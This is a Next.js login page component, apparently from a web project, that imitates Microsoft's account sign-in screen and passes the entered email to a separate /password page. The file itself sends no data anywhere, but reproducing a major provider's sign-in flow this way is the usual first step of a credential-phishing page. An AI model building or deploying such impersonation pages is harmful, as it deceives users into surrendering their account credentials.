"use client"
import Image from "next/image";
import React, { useState } from "react";
import { useRouter } from "next/navigation";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const router = useRouter();

  const handleNext = (e) => {
    e.preventDefault();
    if (email.trim()) {
      router.push(`/password?email=${encodeURIComponent(email)}`);
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-sm">
        
        <div className="flex items-center justify-center mb-4">
          <Image src="/image.png" alt="Login logo" width={120} height={25} />
        </div>

      
        <h2 className="flex items-center justify-center text-xl font-sans mb-2">Sign in</h2>
        <p className="flex items-center justify-center text-gray-600 mb-6">Use your Microsoft account</p>

       
        <form onSubmit={handleNext}>
          <div className="relative mb-4">
            <input
              type="text"
              id="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="peer border-b-2 border-gray-300 focus:border-blue-600 outline-none w-full py-2 placeholder-transparent"
              placeholder="Enter your email"
            />
            <label
              htmlFor="email"
              className="absolute left-0 -top-3.5 text-gray-500 text-sm peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-placeholder-shown:top-2 transition-all"
            >
              Email or phone number
            </label>
          </div>

         
          <p className="text-blue-600 text-sm mb-6 cursor-pointer hover:underline">
            Forgot your username?
          </p>

         
          <button
            type="submit"
            className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700"
          >
            Next
          </button>
        </form>

        <p className="mt-6 text-sm">
          New to Microsoft?{" "}
          <span className="text-blue-600 cursor-pointer hover:underline">
            Create an account
          </span>
        </p>
      </div>
    </div>
  );
}
